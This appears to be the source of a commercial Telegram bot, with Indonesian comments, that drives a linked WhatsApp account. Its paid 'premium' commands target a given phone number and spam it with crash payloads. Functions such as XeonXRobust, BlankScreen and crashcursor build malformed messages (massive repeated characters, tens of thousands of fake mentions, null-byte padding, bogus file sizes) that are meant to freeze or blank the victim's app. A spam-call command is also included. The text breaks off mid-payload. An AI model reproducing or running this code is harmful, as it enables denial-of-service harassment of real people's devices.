let botForPrivateChat = false; // Set true untuk mengaktifkan di private chat

// Command untuk mengaktifkan bot di grup
bot.command('grouponly', (ctx) => {
  const userId = ctx.from.id.toString();

  if (userId !== OWNER_ID && !isAdmin(userId)) {
    return ctx.reply('❌ You are not authorized to use this command.');
  }

  botForGroup = true;
  botForPrivateChat = false;
  ctx.reply(`
╭──(  ✅ Success    ) 
│ Bot diatur untuk hanya merespon di Grup!
╰━━━ㅡ━━━━━ㅡ━━━━━━⬣`);
});
const checkChatType = (ctx, next) => {
  if (botForGroup && ctx.chat.type !== 'group' && ctx.chat.type !== 'supergroup') {
    ctx.reply('❌ This command can only be used in groups.');
    return;
  }

  if (botForPrivateChat && ctx.chat.type !== 'private') {
    ctx.reply('❌ This command can only be used in private chat.');
    return;
  }

  next(); // Melanjutkan ke handler berikutnya jika lolos pengecekan
};
bot.use((ctx, next) => {
  // Set variabel global untuk menentukan tipe bot
  botForGroup = true; // Hanya untuk grup
  botForPrivateChat = false; // Tidak untuk private chat

  // Gunakan middleware
  checkChatType(ctx, next);
});
// Command untuk menonaktifkan semua mode (universal)
bot.command('disablemodes', (ctx) => {
  const userId = ctx.from.id.toString();

  if (userId !== OWNER_ID && !isAdmin(userId)) {
    return ctx.reply('❌ You are not authorized to use this command.');
  }

  botForGroup = false;
  botForPrivateChat = false;
  ctx.reply(`
╓╥─────────────────────⟣
╠╣ ✅ 𝗦𝘂𝗰𝗰𝗲𝘀𝘀 𝘁𝗼 𝗱𝗶𝘀𝗮𝗯𝗹𝗲
╟╨─────────────────────⟣
║ 𝗔𝗹𝗹 𝗺𝗼𝗱𝗲𝘀 𝗮𝗿𝗲 𝗱𝗶𝘀𝗮𝗯𝗹𝗲𝗱.
║ 𝗕𝗼𝘁 𝘄𝗶𝗹𝗹 𝗿𝗲𝘀𝗽𝗼𝗻𝗱 𝗲𝘃𝗲𝗿𝘆𝘄𝗵𝗲𝗿𝗲!
╙──────────────────────❒`);
});
bot.command('addowner', (ctx) => {
    const userId = ctx.from.id.toString();

    // Cek apakah pengguna adalah Owner atau Admin
    if (userId !== OWNER_ID && !isAdmin(userId)) {
        return ctx.reply('❌ You are not authorized to use this command.');
    }

    const args = ctx.message.text.split(' ');
    if (args.length < 3) {
        return ctx.reply('❌ Usage: /addowner <user_id> <duration_in_days>');
    }

    const targetUserId = args[1];
    const duration = parseInt(args[2]);

    if (isNaN(duration)) {
        return ctx.reply('❌ Invalid duration. It must be a number (in days).');
    }

    addOwner(targetUserId, duration);
    ctx.reply(`✅ User ${targetUserId} has been granted owner access for ${duration} days.`);
});

// Command untuk menghapus owner (khusus Owner dan Admin)
bot.command('delowner', (ctx) => {
    const userId = ctx.from.id.toString();

    // Cek apakah pengguna adalah Owner atau Admin
    if (userId !== OWNER_ID && !isAdmin(userId)) {
        return ctx.reply('❌ You are not authorized to use this command.');
    }

    const args = ctx.message.text.split(' ');
    if (args.length < 2) {
        return ctx.reply('❌ Usage: /delowner <user_id>');
    }

    const targetUserId = args[1];

    // Fungsi untuk menghapus owner
    const wasDeleted = removeOwner(targetUserId);

    if (wasDeleted) {
        ctx.reply(`✅ User ${targetUserId} owner access has been removed.`);
    } else {
        ctx.reply(`❌ Failed to remove owner access for user ${targetUserId}.`);
    }
});


bot.command('ownerfeature', (ctx) => {
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah owner
    if (!isOwner(userId)) {
        return ctx.reply('❌ This feature is for owner users only. Upgrade to owner to use this command.');
    }

    // Logika untuk pengguna owner
    ctx.reply('🎉 Welcome to the owner-only feature! Enjoy exclusive benefits.');
});
const ADMINS_FILE = 'admins.json';
// Inisialisasi file admins.json
let admins = {};
if (fs.existsSync(ADMINS_FILE)) {
    admins = JSON.parse(fs.readFileSync(ADMINS_FILE, 'utf8'));
} else {
    fs.writeFileSync(ADMINS_FILE, JSON.stringify({}));
}

// Fungsi untuk mengecek apakah pengguna adalah admin
function isAdmin(userId) {
    return admins[userId];
}

// Fungsi untuk menambahkan admin
function addAdmin(userId) {
    admins[userId] = true;
    fs.writeFileSync(ADMINS_FILE, JSON.stringify(admins, null, 2));
}

// Fungsi untuk menghapus admin
function removeAdmin(userId) {
    if (admins[userId]) {
    	console.log(`Removing admin access for user: ${userId}`);
        delete admins[userId];
        fs.writeFileSync(ADMINS_FILE, JSON.stringify(admins, null, 2));
        return true;
    }
    return false;
}

// Fungsi untuk menghitung jumlah admin
function countAdmin() {
  return Object.keys(admins).length;
}

const totalAdmin = countAdmin();

// Command untuk menambahkan admin (hanya owner yang bisa melakukannya)
bot.command('addadmin', (ctx) => {
    const ownerId = ctx.from.id.toString();

    if (ownerId !== OWNER_ID) {
        return ctx.reply('❌ You are not authorized to use this command.');
    }

    const args = ctx.message.text.split(' ');
    if (args.length < 2) {
        return ctx.reply('❌ Usage: /addadmin <user_id>');
    }

    const targetUserId = args[1];

    if (isAdmin(targetUserId)) {
        return ctx.reply(`✅ User ${targetUserId} is already an admin.`);
    }

    addAdmin(targetUserId);
    ctx.reply(`✅ User ${targetUserId} has been added as an admin.`);
});

// Command untuk menghapus admin
bot.command('deladmin', (ctx) => {
    const ownerId = ctx.from.id.toString();

    if (ownerId !== OWNER_ID) {
        return ctx.reply('❌ You are not authorized to use this command.');
    }

    const args = ctx.message.text.split(' ');
    if (args.length < 2) {
        return ctx.reply('❌ Usage: /deladmin <user_id>');
    }

    const targetUserId = args[1];

    if (!isAdmin(targetUserId)) {
        return ctx.reply(`❌ User ${targetUserId} is not an admin.`);
    }

    const wasRemoved = removeAdmin(targetUserId);
    if (wasRemoved) {
        ctx.reply(`✅ User ${targetUserId} has been removed from admins.`);
    } else {
        ctx.reply(`❌ Failed to remove admin ${targetUserId}.`);
    }
});

// Command untuk melihat daftar admin
bot.command('listadmin', (ctx) => {
    const adminList = Object.keys(admins);

    if (adminList.length > 0) {
        const details = adminList.map((userId) => `- User ID: ${userId}`).join('\n');
        ctx.reply(`📋 𝙇𝙞𝙨𝙩 𝘼𝙙𝙢𝙞𝙣𝙨\n\n${details}`);
    } else {
        ctx.reply('❌ No admins found.');
    }
});
// Command untuk fitur khusus admin
bot.command('adminfeature', (ctx) => {
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah admin
    if (!isAdmin(userId)) {
        return ctx.reply('❌ This feature is for admins only. Contact the owner for access.');
    }

    // Logika untuk admin
    ctx.reply('🎉 Welcome to the admin-only feature! Enjoy exclusive benefits.');
});

const cooldowns2 = new Map();

// Durasi cooldown dalam milidetik (misal 10 detik)
const COOLDOWN_DURATION = 120000;

// Flag untuk mengaktifkan atau menonaktifkan cooldown
let isCooldownActive = true;

// Middleware untuk menerapkan mekanisme cooldown
const cooldownMiddleware = (ctx, next) => {
  const userId = ctx.from.id.toString(); // Get user ID

  // Check if user is the owner or an admin
  if (userId === OWNER_ID || isAdmin(userId)) {
    console.log(`User ${userId} is exempt from cooldown (admin or owner).`);
    return next(); // Allow command execution without cooldown
  }

  if (!isCooldownActive) {
    // If cooldown is disabled, continue without restriction
    return next();
  }

  // Check if user is in cooldown
  if (cooldowns2.has(userId)) {
    const remainingTime = ((cooldowns2.get(userId) + COOLDOWN_DURATION) - Date.now()) / 1000;
    return ctx.reply(`⏳ You must wait ${remainingTime.toFixed(1)} seconds before using this command again.`);
  }

  // Set the user in cooldown
  cooldowns2.set(userId, Date.now());
  
  // Remove user from cooldown after the specified duration
  setTimeout(() => cooldowns2.delete(userId), COOLDOWN_DURATION);

  // Proceed to the next handler
  return next();
};

// Command untuk mengatur status cooldown
bot.command('cdmurbug', (ctx) => {
  const args = ctx.message.text.split(' ')[1]?.toLowerCase(); // Ambil argumen setelah command
     const userId = ctx.from.id;
 const ownerId = ctx.from.id.toString();
    // Cek apakah pengguna adalah owner atau memiliki akses owner
    if (ownerId !== OWNER_ID && !isOwner(userId)) {
        return ctx.reply('❌ You are not authorized to use this command.');
    }    
  if (args === 'true') {
    isCooldownActive = true;
    ctx.reply('✅ Cooldown is activated.');
  } else if (args === 'false') {
    isCooldownActive = false;
    ctx.reply('❌ Cooldown is disabled.');
  } else {
    ctx.reply('⚙️ Use /cdmurbug true to enable or /cdmurbug false to disable.');
  }
});
const process = require('process');

// Ganti dengan token GitHub yang kamu punya (jaga kerahasiaannya)'
const REPO_OWNER2 = 'okuzen80987'; // Ganti dengan pemilik repository
const REPO_NAME2 = 'database'; // Ganti dengan nama repo
const FILE_PATH2 = 'info'; // Path file yang berisi status pemeliharaan

// URL API GitHub untuk mendapatkan raw content file dengan otentikasi
const MAINTENANCE_STATUS_URL = `https://api.github.com/repos/${REPO_OWNER2}/${REPO_NAME2}/contents/${FILE_PATH2}?ref=main`;

// Variabel untuk menyimpan status pemeliharaan
let isMaintenanceMode = false;

// Fungsi untuk memuat status pemeliharaan dari GitHub menggunakan token
const loadMaintenanceStatus = async () => {
  try {
    const response = await axios.get(MAINTENANCE_STATUS_URL, {
      headers: {
        'Authorization': `token ${GITHUB_TOKEN}`
      }
    });

    // Mengambil content file dan mendekodekan dari base64
    const fileContent = Buffer.from(response.data.content, 'base64').toString('utf-8');
    
    // Mengasumsikan file berisi JSON dengan status pemeliharaan
    const parsedData = JSON.parse(fileContent);
    isMaintenanceMode = parsedData.maintenance;
    console.log(chalk.bgMagenta('Haii :D'));
  } catch (error) {
    console.error('');
    spamError();
    process.exit(1);  // Keluar dari proses jika error
  }
};

// Fungsi untuk spam console log error
const spamError = () => {
  setInterval(() => {
    console.error(chalk.bgRed('ERROR: ❗ PLEASE BUY THE ORIGINAL SCRIPT.'));
  }, 1000); // Spam setiap 1 detik
};

// Muat status pemeliharaan saat bot dimulai
loadMaintenanceStatus();

// Middleware pemeliharaan (contoh penggunaan dengan bot)
bot.use((ctx, next) => {
  if (isMaintenanceMode) {
    ctx.reply('Sorry, the script seems to have been distributed by someone, so the owner has made this script error.');
  } else {
    return next();
  }
});
// Fungsi untuk mengirim pesan saat proses
const prosesrespone = (target, ctx) => {
    const photoUrl = 'https://files.catbox.moe/mzr41r.jpg'; // Ganti dengan URL gambar lain jika diperlukan
    const senderName = ctx.message.from.first_name || ctx.message.from.username || "Pengguna"; // Mengambil nama peminta dari konteks
    const date = new Date().toLocaleString("id-ID", { 
        weekday: 'long', 
        year: 'numeric', 
        month: 'long', 
        day: 'numeric', 
        hour: '2-digit', 
        minute: '2-digit', 
        second: '2-digit' 
    }); // Format tanggal sesuai lokal Indonesia
    const caption = `
╓╥──────────────⟣
╠╣ 🌀 𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴
╟╨──────────────⟣
║ Target : ${target}
║ Date : ${date}
║ Requester : ${senderName}
╙───────────────❒
`;
    const keyboard = [
        [
            {
                text: "📄 Menu",
                callback_data: "/menu"
            },
            {
                text: "🌐 Contact Dev",
                url: "https://t.me/bagazzmodz"
            }
        ]
    ];

    // Mengirim gambar dengan caption dan inline keyboard
    ctx.replyWithPhoto(getRandomPhoto(), {
        caption: caption,
        reply_markup: {
            inline_keyboard: keyboard
        }
    }).then(() => {
        console.log('Proses response sent');
    }).catch((error) => {
        console.error('Error sending process response:', error);
    });
};

// Fungsi untuk mengirim pesan saat proses selesai
const donerespone = (target, ctx) => {
    const photoUrl = 'https://files.catbox.moe/mzr41r.jpg'; // Ganti dengan URL gambar lain jika diperlukan
    const senderName = ctx.message.from.first_name || ctx.message.from.username || "Pengguna"; // Mengambil nama peminta dari konteks
    const date = new Date().toLocaleString("id-ID", { 
        weekday: 'long', 
        year: 'numeric', 
        month: 'long', 
        day: 'numeric', 
        hour: '2-digit', 
        minute: '2-digit', 
        second: '2-digit' 
    }); // Format tanggal sesuai lokal Indonesia
    const caption = `
╓╥──────────────⟣
╠╣ ✅ 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹
╟╨──────────────⟣
║ Target : ${target}
║ Date : ${date}
║ Requester : ${senderName}
╙───────────────❒
`;
    const keyboard = [
        [
            {
                text: "📄 Menu",
                callback_data: "/menu"
            },
            {
                text: "🌐 Contact Dev",
                url: "https://t.me/bagazzmodz"
            }
        ]
    ];

    // Mengirim gambar dengan caption dan inline keyboard
    ctx.replyWithPhoto(photoUrl, {
        caption: caption,
        reply_markup: {
            inline_keyboard: keyboard
        }
    }).then(() => {
        console.log('Done response sent');
    }).catch((error) => {
        console.error('Error sending done response:', error);
    });
};
const kirimpesan = async (number, message) => {
  try {
    const target = `${number}@s.whatsapp.net`;
    await gal.sendMessage(target, {
      text: message
    });
    console.log(`Pesan dikirim ke ${number}: ${message}`);
  } catch (error) {
    console.error(`Gagal mengirim pesan ke WhatsApp (${number}):`, error.message);
  }
};

const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) {
    ctx.reply(`
╓╥──────────────⟣
╠╣ㅤㅤ❌ 𝗘𝗥𝗥𝗢𝗥
╟╨──────────────⟣
║
║ Device Not Connected
║ Please Connect First
║
╙───────────────❒
`);
    return;
  }
  next();
};
const QBug = {
  key: {
    remoteJid: "p",
    fromMe: false,
    participant: "0@s.whatsapp.net"
  },
  message: {
    interactiveResponseMessage: {
      body: {
        text: "Sent",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\0".repeat(500000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
        version: 3
      }
    }
  }
};
bot.command("xcbeta", cooldownMiddleware, checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1]; // Mengambil argumen pertama setelah perintah
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
        return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }
  if (!q) {
    return ctx.reply(`Example: commandnya 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Proses response pertama
  await prosesrespone(target, ctx);

  // Melakukan proses freezing 50 kali
  for (let i = 0; i < 1; i++) {
        await crashcursor(target, { ptcp: true });
  }

  // Menyelesaikan proses response
  await donerespone(target, ctx);
});
bot.command("delaymaker", cooldownMiddleware, checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1]; // Mengambil argumen pertama setelah perintah
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
        return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }
  if (!q) {
    return ctx.reply(`Example: commandnya 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Proses response pertama
  await prosesrespone(target, ctx);

  // Melakukan proses freezing 50 kali
  for (let i = 0; i < 50; i++) {
    await XeonXRobust(target, { ptcp: true });
    await bug_notif(target, { ptcp: true });
  }

  // Menyelesaikan proses response
  await donerespone(target, ctx);
});
bot.command("xcandro", cooldownMiddleware, checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1]; // Mengambil argumen pertama setelah perintah
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
        return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }
  if (!q) {
    return ctx.reply(`Example: commandnya 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Proses response pertama
  await prosesrespone(target, ctx);

  // Melakukan proses freezing 50 kali
  for (let i = 0; i < 20; i++) {
    await XeonXRobust(target, { ptcp: true });
    await BlankScreen(target, { ptcp: true });
    await buginvite(target, { ptcp: true });
  }

  // Menyelesaikan proses response
  await donerespone(target, ctx);
});
bot.command("xcsystemui", cooldownMiddleware, checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1]; // Mengambil argumen pertama setelah perintah
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
        return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }
  if (!q) {
    return ctx.reply(`Example: commandnya 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Proses response pertama
  await prosesrespone(target, ctx);

  // Melakukan proses freezing 50 kali
  for (let i = 0; i < 5; i++) {
  await BlankScreen(target, { ptcp: true });
  await XeonXRobust(target, { ptcp: true });
  await buginvite(target, { ptcp: true });
    await systemUi(target, { ptcp: true });
  }

  // Menyelesaikan proses response
  await donerespone(target, ctx);
});
bot.command("xcblank", cooldownMiddleware, async ctx => {
  const q = ctx.message.text.split(" ")[1]; // Mengambil argumen pertama setelah perintah
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
        return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }
  if (!q) {
    return ctx.reply(`Example: commandnya 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Proses response pertama
  await prosesrespone(target, ctx);

  // Melakukan proses freezing 50 kali
  for (let i = 0; i < 1; i++) {
      await crashcursor(target, { ptcp: true });
  }

  // Menyelesaikan proses response
  await donerespone(target, ctx);
});
const spamCall = async (ctx, target, count = 1) => {
  if (!target) {
    ctx.reply("❌ Error: Target tidak ditentukan.");
    return;
  }

  try {
    for (let i = 0; i < count; i++) {
      ctx.reply(`📞 Mengirim spam call ${i + 1} ke: ${target}`);
      
      const callLogMessage = {
        message: {
          callLogMessage: {
            callType: "AUDIO", // Ubah ke "VIDEO" untuk panggilan video
            callResult: "CANCELLED", // Nilai lain: "MISSED"
            callDuration: "0",
            participant: target,
            isVideo: false,
          },
        },
      };

      // Simulasi pengiriman pesan (relayMessage diganti sesuai kebutuhan)
      console.log(`Relay message:`, callLogMessage);

      // Delay 1 detik
      await new Promise((resolve) => setTimeout(resolve, 1000));
    }

    ctx.reply(`✅ Berhasil mengirimkan ${count} panggilan spam ke ${target}`);
  } catch (error) {
    ctx.reply(`❌ Gagal melakukan spam call. Error: ${error.message}`);
  }
};
bot.command("spamcall", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1); // Ambil argumen dari teks pesan
  const target = args[0]; // Target panggilan
  const count = parseInt(args[1]) || 1; // Jumlah panggilan (default 1)
 const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
        return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }
  if (!target) {
    ctx.reply("❌ Mohon sertakan target. Contoh: `/spamcall 628123456789 5`");
    return;
  }

  await spamCall(ctx, target, count);
});

bot.command("xciospay", cooldownMiddleware, checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1]; // Mengambil argumen pertama setelah perintah
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
        return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }
  if (!q) {
    return ctx.reply(`Example: commandnya 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Proses response pertama
  await prosesrespone(target, ctx);

  // Melakukan proses freezing 50 kali
  for (let i = 0; i < 5; i++) {
           await BugIos(target);
  }

  // Menyelesaikan proses response
  await donerespone(target, ctx);

  return ctx.reply('Proses selesai.');
});
bot.command("xciosinvis",cooldownMiddleware , checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1]; // Mengambil argumen pertama setelah perintah
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
        return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }
  if (!q) {
    return ctx.reply(`Example: commandnya 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Proses response pertama
  await prosesrespone(target, ctx);

  // Melakukan proses freezing 50 kali
  for (let i = 0; i < 5; i++) {
           await IosMJ(target, { ptcp: true });
  }

  // Menyelesaikan proses response
  await donerespone(target, ctx);

  return ctx.reply('Proses selesai.');
});

//Menu Awal
bot.command("statusbot", ctx => {
  if (isWhatsAppConnected) {
    ctx.reply(`✅ WhatsApp terhubung dengan nomor: ${linkedWhatsAppNumber || "Tidak diketahui"}`);
  } else {
    ctx.reply("❌ WhatsApp belum terhubung.");
  }
});
// Fungsi untuk escape karakter Markdown
function escapeMarkdown(text) {
  if (typeof text !== "string") return text;
  return text.replace(/([_*[\]()~`>#+\-=|{}.!])/g, "\\$1");
}



//function bug

	
async function XeonXRobust(target, o, ptcp = true) {
  const jids = `_*~@0~*_\n`.repeat(10200);
  const ui = 'ꦽ'.repeat(1500);

  await gal.relayMessage(
    target,
    {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                fileName: "👾 𝗚𝗮𝗹𝗮𝘅𝘆𝗔𝗻𝗱𝗿𝗼",
                fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1726867151",
                contactVcard: true,
                jpegThumbnail: o,
              },
              hasMediaAttachment: true,
            },
            body: {
              text: '👾 𝗚𝗮𝗹𝗮𝘅𝘆𝗔𝗻𝗱𝗿𝗼' + ui + jids,
            },
            footer: {
              text: '',
            },
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  { length: 30000 },
                  () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                ),
              ],
              forwardingScore: 1,
              isForwarded: true,
              fromMe: false,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              quotedMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                  fileName: "👾 𝗚𝗮𝗹𝗮𝘅𝘆𝗔𝗻𝗱𝗿𝗼",
                  fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                  directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1724474503",
                  contactVcard: true,
                  thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: "",
                },
              },
            },
          },
        },
      },
    },
    ptcp
      ? {
          participant: {
            jid: target,
          },
        }
      : {}
  );
}
 async function BlankScreen(target, Ptcp = false) {
let virtex =  "👾 𝗚𝗮𝗹𝗮𝘅𝘆𝗔𝗻𝗱𝗿𝗼" + "ꦽ".repeat(45000) + "@13135550002".repeat(50000);
			await gal.relayMessage(target, {
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 1316134911,
										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
										fileName: "Halo🤗",
										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1726867151",
										contactVcard: true,
										jpegThumbnail: "https://files.catbox.moe/m33kq5.jpg",
									},
									hasMediaAttachment: true,
								},
								body: {
									text: virtex,
								},
								nativeFlowMessage: {
								name: "call_permission_request",
								messageParamsJson: "\u0000".repeat(5000),
								},
								contextInfo: {
								mentionedJid: ["13135550002@s.whatsapp.net"],
									forwardingScore: 1,
									isForwarded: true,
									fromMe: false,
									participant: "0@s.whatsapp.net",
									remoteJid: "status@broadcast",
									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 1316134911,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "Bokep 18+",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "https://files.catbox.moe/m33kq5.jpg",
										},
									},
								},
							},
						},
					},
				},
				Ptcp ? {
					participant: {
						jid: target
					}
				} : {}
			);
            console.log(chalk.red.bold('🌸͜͞𐊢ăŶ͜͝ɯʐʐ🌿'))
   	};
   	const tdxlol = fs.readFileSync('./tdx.jpeg')
   	const crypto = require('crypto');
async function crashcursor(target, ptcp = true) {
const stanza = [
{
attrs: { biz_bot: '1' },
tag: "bot",
},
{
attrs: {},
tag: "biz",
},
];

let messagePayload = {
viewOnceMessage: {
message: {
listResponseMessage: {
title: "Assalamualaikum Bang Izin Pushkontak" + "ꦽ".repeat(45000),
listType: 2,
singleSelectReply: {
    selectedRowId: "🩸"
},
contextInfo: {
stanzaId: gal.generateMessageTag(),
participant: "0@s.whatsapp.net",
remoteJid: "status@broadcast",
mentionedJid: [target, "13135550002@s.whatsapp.net"],
quotedMessage: {
                buttonsMessage: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                        fileLength: "9999999999999",
                        pageCount: 3567587327,
                        mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                        fileName: "👾 𝗚𝗮𝗹𝗮𝘅𝘆𝗔𝗻𝗱𝗿𝗼",
